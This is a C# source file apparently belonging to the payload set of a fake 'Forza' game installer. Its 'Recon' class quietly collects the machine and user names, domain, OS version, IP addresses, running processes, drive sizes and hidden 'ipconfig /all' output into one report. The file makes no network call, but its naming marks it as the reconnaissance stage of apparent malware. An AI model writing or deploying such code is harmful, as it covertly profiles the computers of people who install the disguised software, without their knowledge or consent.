using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;

namespace ForzaInstallation.Payloads
{
    internal static class Recon
    {
        internal static string Collect()
        {
            var sb = new StringBuilder();
            sb.AppendLine("=== SYSTEM ===");
            sb.AppendLine("Host: " + Environment.MachineName);
            sb.AppendLine("User: " + Environment.UserName);
            sb.AppendLine("Domain: " + Environment.UserDomainName);
            sb.AppendLine("OS: " + Environment.OSVersion);
            sb.AppendLine("64-bit: " + Environment.Is64BitOperatingSystem);
            sb.AppendLine("Processors: " + Environment.ProcessorCount);
            sb.AppendLine("CLR: " + Environment.Version);
            try
            {
                var host = Dns.GetHostEntry(Environment.MachineName);
                foreach (var ip in host.AddressList)
                    sb.AppendLine("IP: " + ip);
            }
            catch { }
            sb.AppendLine();
            sb.AppendLine("=== PROCESSES ===");
            try
            {
                foreach (var p in Process.GetProcesses())
                {
                    try { sb.AppendLine(p.ProcessName + " (PID: " + p.Id + ")"); } catch { }
                }
            }
            catch { }
            sb.AppendLine();
            sb.AppendLine("=== DRIVES ===");
            foreach (var d in DriveInfo.GetDrives())
            {
                try
                {
                    if (d.IsReady)
                        sb.AppendLine(string.Format("{0} {1} {2:F1}GB / {3:F1}GB free", d.Name, d.DriveFormat, (double)d.TotalSize / 1073741824.0, (double)d.AvailableFreeSpace / 1073741824.0));
                }
                catch { }
            }
            sb.AppendLine();
            sb.AppendLine("=== NETWORK ===");
            try
            {
                var psi = new ProcessStartInfo("ipconfig", "/all")
                {
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                using (var p = Process.Start(psi))
                {
                    var o = p.StandardOutput.ReadToEnd();
                    p.WaitForExit(10000);
                    sb.AppendLine(o.Length > 1500 ? o.Substring(0, 1500) : o);
                }
            }
            catch { }
            return sb.ToString();
        }
    }
}
